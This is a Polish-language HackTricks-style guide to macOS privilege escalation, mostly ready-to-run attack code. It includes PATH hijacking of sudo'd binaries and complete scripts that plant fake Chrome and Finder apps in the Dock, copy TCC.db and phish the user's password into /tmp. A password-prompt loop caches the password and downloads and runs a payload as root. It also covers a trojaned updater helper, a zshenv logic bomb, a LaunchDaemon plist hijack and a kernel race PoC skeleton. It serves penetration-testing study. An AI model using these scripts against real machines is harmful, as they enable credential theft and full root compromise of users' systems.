# macOS Escalacja uprawnień

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Jeśli szukasz informacji o TCC privilege escalation, przejdź do:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Pamiętaj, że **większość trików dotyczących privilege escalation wpływających na systemy Linux/Unix będzie miała zastosowanie również na maszynach MacOS**. Zobacz więc:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Interakcja z użytkownikiem

### Sudo Hijacking

Oryginalną technikę [Sudo Hijacking znajdziesz we wpisie dotyczącym Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Jednak macOS **zachowuje** **`PATH`** użytkownika podczas wykonywania przez niego **`sudo`**. Oznacza to, że innym sposobem przeprowadzenia tego ataku byłoby **przejęcie innych plików binarnych**, które ofiara nadal uruchomi podczas **wykonywania sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Należy pamiętać, że użytkownik korzystający z terminala najprawdopodobniej ma **zainstalowany Homebrew**. Możliwe jest więc przejęcie binariów w **`/opt/homebrew/bin`**.

### Dock Impersonation

Korzystając z **social engineering**, można **podszyć się na przykład pod Google Chrome** w Docku i faktycznie uruchomić własny skrypt:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Kilka sugestii:

- Sprawdź w Docku, czy znajduje się tam Chrome, a jeśli tak, **usuń** ten wpis i **dodaj** **fałszywy** wpis **Chrome** w tej samej pozycji w tablicy Docka.

<details>
<summary>Skrypt do podszywania się pod Chrome w Docku</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Kilka sugestii:

- **Nie możesz usunąć Findera z Docka**, więc jeśli zamierzasz dodać go do Docka, możesz umieścić fałszywego Findera tuż obok prawdziwego. W tym celu musisz **dodać wpis fałszywego Findera na początku tablicy Docka**.
- Inną opcją jest nieumieszczanie go w Docku i po prostu jego otwarcie — komunikat „Finder asks to control Finder” nie jest szczególnie dziwny.
- Inną opcją na **eskalację do roota bez pytania** o hasło za pomocą okropnego okna jest sprawienie, aby Finder rzeczywiście poprosił o hasło w celu wykonania uprzywilejowanej akcji:
- Poproś Findera o skopiowanie nowego pliku **`sudo`** do **`/etc/pam.d`**. (Monit proszący o hasło będzie informował, że „Finder wants to copy sudo”).
- Poproś Findera o skopiowanie nowego **Authorization Plugin**. (Możesz kontrolować nazwę pliku, dzięki czemu monit proszący o hasło będzie informował, że „Finder wants to copy Finder.bundle”).

<details>
<summary>Skrypt podszywający się pod Finder w Docku</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Phishing przy użyciu promptu hasła + ponowne użycie sudo

Malware często wykorzystuje interakcję z użytkownikiem, aby **przechwycić hasło użytkownika uprawnionego do sudo** i programowo je ponownie wykorzystać. Typowy przebieg:

1. Zidentyfikuj zalogowanego użytkownika za pomocą `whoami`.
2. **Powtarzaj prompty hasła** do momentu, aż `dscl . -authonly "$user" "$pw"` zwróci powodzenie.
3. Zapisz dane uwierzytelniające w cache (np. `/tmp/.pass`) i wykonuj uprzywilejowane działania za pomocą `sudo -S` (hasło przez standardowe wejście).

Minimalny przykładowy łańcuch:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Skradzione hasło można następnie ponownie wykorzystać do **wyczyszczenia kwarantanny Gatekeeper za pomocą `xattr -c`**, kopiowania LaunchDaemons lub innych plików uprzywilejowanych oraz uruchamiania dodatkowych etapów w sposób nieinteraktywny.

## Nowsze wektory specyficzne dla macOS (2023–2025)

### Przestarzałe `AuthorizationExecuteWithPrivileges` nadal działa

`AuthorizationExecuteWithPrivileges` zostało oznaczone jako przestarzałe w wersji 10.7, ale **nadal działa w Sonoma/Sequoia**. Wiele komercyjnych aktualizatorów wywołuje `/usr/libexec/security_authtrampoline` z niezaufaną ścieżką. Jeśli docelowy plik binarny można modyfikować jako użytkownik, możesz umieścić trojana i wykorzystać legalny monit:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Połącz z **masquerading tricks above**, aby przedstawić wiarygodne okno dialogowe hasła.


### Triage uprzywilejowanego helpera / XPC

Wiele współczesnych third-party macOS privescs opiera się na tym samym schemacie: **root LaunchDaemon** udostępnia usługę **Mach/XPC** z **`/Library/PrivilegedHelperTools`**, a następnie helper albo **nie weryfikuje klienta**, weryfikuje go **zbyt późno** (race PID), albo udostępnia **root method**, która przyjmuje ścieżkę/skrypt kontrolowane przez użytkownika. To klasa błędów leżąca u podstaw wielu niedawnych błędów helperów w klientach VPN, game launcherach i updaterach.

Szybka checklista triage:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Zwróć szczególną uwagę na helpery, które:

- nadal akceptują żądania **po odinstalowaniu**, ponieważ zadanie pozostało załadowane w `launchd`
- wykonują skrypty lub odczytują konfigurację z **`/Applications/...`** albo innych ścieżek zapisywalnych przez użytkowników bez uprawnień root
- polegają na walidacji peerów opartej na **PID** lub wyłącznie na **bundle-id**, która może być podatna na race condition

Więcej informacji na temat błędów autoryzacji helperów znajdziesz na [tej stronie](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Dziedziczenie środowiska skryptów PackageKit (CVE-2024-27822)

Do czasu naprawienia tego problemu przez Apple w wersjach **Sonoma 14.5**, **Ventura 13.6.7** i **Monterey 12.7.5** instalacje inicjowane przez użytkownika za pomocą **`Installer.app`** / **`PackageKit.framework`** mogły wykonywać **skrypty PKG jako root w środowisku bieżącego użytkownika**. Oznacza to, że pakiet używający **`#!/bin/zsh`** ładowałby **`~/.zshenv`** atakującego i uruchamiał go jako **root**, gdy ofiara instalowała pakiet.

Jest to szczególnie interesujące jako **logic bomb**: wystarczy foothold na koncie użytkownika oraz zapisywalny plik startowy powłoki, a następnie można czekać, aż użytkownik uruchomi dowolny podatny instalator oparty na **zsh**. Zasadniczo nie dotyczy to wdrożeń **MDM/Munki**, ponieważ są one uruchamiane w środowisku użytkownika root.
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Jeśli chcesz dokładniej przeanalizować nadużycia specyficzne dla installerów, sprawdź również [tę stronę](macos-files-folders-and-binaries/macos-installers-abuse.md).

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Jeśli LaunchDaemon plist lub jego cel `ProgramArguments` jest **user-writable**, możesz dokonać eskalacji, podmieniając go, a następnie wymuszając ponowne załadowanie przez launchd:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Odzwierciedla to wzorzec exploita opublikowany dla **CVE-2025-24085**, w którym zapisywalny plist został wykorzystany do wykonania kodu atakującego jako root.

### XNU SMR credential race (CVE-2025-24118)

**Race w `kauth_cred_proc_update`** pozwala lokalnemu atakującemu uszkodzić wskaźnik poświadczeń tylko do odczytu (`proc_ro.p_ucred`) poprzez wykonywanie pętli `setgid()`/`getgid()` w wielu wątkach do momentu wystąpienia nieatomowego `memcpy`. Pomyślne uszkodzenie zapewnia **uid 0** oraz dostęp do pamięci kernela. Minimalna struktura PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Połącz z heap grooming, aby umieścić kontrolowane dane w miejscu, z którego wskaźnik ponownie odczytuje dane. W podatnych buildach zapewnia to niezawodny **local kernel privesc** bez konieczności omijania SIP.

### Ominięcie SIP przez Migration Assistant („Migraine”, CVE-2023-32369)

Jeśli masz już root, SIP nadal blokuje zapisy w lokalizacjach systemowych. Błąd **Migraine** wykorzystuje entitlement Migration Assistant `com.apple.rootless.install.heritable` do uruchomienia procesu potomnego, który dziedziczy możliwość ominięcia SIP i nadpisuje chronione ścieżki (np. `/System/Library/LaunchDaemons`). Łańcuch wygląda następująco:

1. Uzyskaj root na działającym systemie.
2. Uruchom `systemmigrationd` ze spreparowanym stanem, aby wykonał binary kontrolowane przez atakującego.
3. Użyj odziedziczonego entitlementu do modyfikacji plików chronionych przez SIP, utrzymując persistence nawet po restarcie.

### Przemycanie wyrażeń NSPredicate/XPC (klasa błędów CVE-2023-23530/23531)

Wiele daemonów Apple akceptuje obiekty **NSPredicate** przez XPC i sprawdza wyłącznie pole `expressionType`, które może kontrolować atakujący. Tworząc predicate, który wywołuje dowolne selektory, można uzyskać **code execution w usługach root/system XPC** (np. `coreduetd`, `contextstored`). W połączeniu z początkowym app sandbox escape zapewnia to **privilege escalation bez promptów użytkownika**. Szukaj endpointów XPC, które deserializują predicate i nie mają solidnego visitora.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass i privilege escalation

**Każdy użytkownik** (nawet nieuprzywilejowany) może utworzyć i zamontować snapshot Time Machine oraz **uzyskać dostęp do WSZYSTKICH plików** tego snapshotu.\
**Jedyne wymagane uprawnienie** dotyczy używanej aplikacji (np. `Terminal`), która musi mieć dostęp **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`); uprawnienie to musi nadać administrator.

<details>
<summary>Montowanie snapshotu Time Machine</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

Bardziej szczegółowe wyjaśnienie można [**znaleźć w oryginalnym raporcie**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Wrażliwe informacje

Może to być przydatne do eskalacji uprawnień:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Odnośniki

- [Microsoft „Migraine” SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [Opis wyścigu credential race i PoC dla CVE-2025-24118 SMR](https://github.com/jprx/CVE-2025-24118)
- [CVE-2024-27822: eskalacja uprawnień w macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [CVE-2024-30165: lokalna eskalacja uprawnień w AWS Client VPN dla macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
